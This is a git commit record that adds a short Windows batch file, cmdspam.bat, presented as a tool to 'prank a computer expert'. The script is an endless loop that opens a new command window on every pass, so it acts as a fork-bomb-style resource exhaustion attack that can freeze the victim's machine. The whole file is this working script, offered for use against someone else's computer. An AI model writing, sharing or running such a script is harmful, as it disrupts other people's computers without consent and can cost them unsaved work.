8d2c5a89055aec58c6a46e07afe30246e64877d5
TheBestUser01234567890 <98957578+TheBestUser01234567890@users.noreply.github.com>
2023-04-01 17:17:05 +0300

    Added cmdspam.bat

---
+++ cmdspam.bat
@@ -0,0 +1,10 @@
+@echo off
+cls
+rem Best ever tool to prank a computer expert!
+
+:prank
+cmd /c echo NEVER GONNA GIVE YOU UP
+start cmd.exe /c echo NEVER GONNA GIVE YOU UP
+goto prank
+
+goto prank
